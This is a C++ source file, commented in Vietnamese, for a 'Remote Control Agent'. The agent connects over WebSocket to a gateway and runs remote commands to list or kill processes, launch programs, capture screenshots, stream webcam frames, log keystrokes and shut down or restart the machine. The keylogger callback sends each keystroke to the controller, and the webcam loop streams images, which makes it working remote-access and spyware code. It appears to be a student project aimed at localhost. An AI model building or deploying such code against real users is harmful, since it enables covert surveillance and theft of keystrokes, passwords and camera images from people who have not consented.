// server.cpp - WebSocket Client (Agent) kết nối tới Gateway
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <string>
#include <chrono>
#include "json.hpp"
#include "../lib/service.h"
#include "asio_no_tls_client.hpp"
#include "client.hpp"

#pragma comment(lib, "Ws2_32.lib")

using json = nlohmann::json;
using namespace std;

typedef websocketpp::client<websocketpp::config::asio_client> client;
client ws_client;
client::connection_ptr connection;
websocketpp::connection_hdl hdl;

void sendJson(const json& j) {
    if (connection && connection->get_state() == websocketpp::session::state::open) {
        ws_client.send(hdl, j.dump(), websocketpp::frame::opcode::text);
        cout << "Sent: " << j.dump() << endl;
    }
}

void sendResponse(const string& type, const string& data = "") {
    json resp = {
        {"type", type},
        {"data", data}
    };
    sendJson(resp);
}

void sendError(const string& msg) {
    json err = {
        {"type", "ERROR"},
        {"data", msg}
    };
    sendJson(err);
}

void on_message(client* c, websocketpp::connection_hdl hdl, client::message_ptr msg) {
    string payload = msg->get_payload();
    cout << "Received: " << payload << endl;

    try {
        json request = json::parse(payload);
        string action = request.value("action", "");

        if (action == "LIST_APPS") {
            sendResponse("LIST_APPS", list_apps());

        } else if (action == "LIST_PROCESS") {
            sendResponse("LIST_PROCESS", list_processes_json());

        } else if (action == "EXECUTE" || action == "start_app") {
            string path = request.value("path", "");
            if (!path.empty()) {
                sendResponse("RESPONSE", start_app(path));
            } else {
                sendError("Thiếu đường dẫn ứng dụng");
            }

        } else if (action == "KILL_BY_PID") {
            int pid = request.value("value", 0);
            if (pid > 0) {
                sendResponse("RESPONSE", stop_process(to_string(pid)));
            }

        } else if (action == "KILL_BY_NAME") {
            string name = request.value("value", "");
            if (!name.empty()) {
                sendResponse("RESPONSE", stop_app(name));
            }

        } else if (action == "SCREENSHOT") {
            string base64_img = capture_screenshot_base64();
            sendResponse("IMAGE_DATA", base64_img);

        } else if (action == "WEBCAM_START") {
            thread([]() {
                while (true) {
                    if (!is_webcam_running()) break;
                    string frame = capture_webcam_frame_base64();
                    if (!frame.empty()) {
                        sendResponse("IMAGE_DATA", frame);
                    }
                    this_thread::sleep_for(chrono::milliseconds(100));
                }
            }).detach();
            start_webcam();
            sendResponse("RESPONSE", "Webcam đã bật");

        } else if (action == "WEBCAM_STOP") {
            stop_webcam();
            sendResponse("RESPONSE", "Webcam đã tắt");

        } else if (action == "START_KEYLOG") {
            start_keylogger();
            // Keylogger sẽ tự động gửi từng phím qua hàm callback bên service.h
            sendResponse("RESPONSE", "Đã bật Keylogger");

        } else if (action == "SHUTDOWN") {
            sendResponse("RESPONSE", "Đang tắt máy...");
            shutdown_system();

        } else if (action == "RESTART") {
            sendResponse("RESPONSE", "Đang khởi động lại...");
            restart_system();

        } else {
            sendError("Lệnh không hỗ trợ: " + action);
        }

    } catch (const exception& e) {
        sendError("Lỗi xử lý lệnh: " + string(e.what()));
    }
}

void on_open(client* c, websocketpp::connection_hdl hdl) {
    cout << "Đã kết nối tới Gateway! Đang đăng ký role agent..." << endl;
    
    json register_msg = {
        {"type", "register"},
        {"role", "agent"}
    };
    c->send(hdl, register_msg.dump(), websocketpp::frame::opcode::text);
}

void on_close(client* c, websocketpp::connection_hdl hdl) {
    cout << "Mất kết nối với Gateway. Đang thử kết nối lại sau 5s..." << endl;
    this_thread::sleep_for(chrono::seconds(5));
    connect_to_gateway();
}

void connect_to_gateway() {
    try {
        ws_client.set_access_channels(websocketpp::log::alevel::all);
        ws_client.clear_access_channels(websocketpp::log::alevel::frame_payload);

        ws_client.init_asio();

        ws_client.set_message_handler(on_message);
        ws_client.set_open_handler(on_open);
        ws_client.set_close_handler(on_close);

        websocketpp::lib::error_code ec;
        client::connection_ptr con = ws_client.get_connection("ws://localhost:8080", ec);
        if (ec) {
            cout << "Lỗi tạo kết nối: " << ec.message() << endl;
            return;
        }

        hdl = con->get_handle();
        connection = con;
        ws_client.connect(con);
        ws_client.run();

    } catch (const exception& e) {
        cout << "Exception: " << e.what() << endl;
    }
}

int main() {
    // Cấu hình để keylogger gửi phím về Gateway
    set_keylog_callback([](char key) {
        json keymsg = {
            {"type", "KEY_DATA"},
            {"data", string(1, key)}
        };
        sendJson(keymsg);
    });

    cout << "Remote Control Agent (C++) đang khởi động...\n";
    cout << "Đang kết nối tới Gateway tại ws://localhost:8080\n";

    connect_to_gateway();

    // Không bao giờ tới đây
    return 0;
}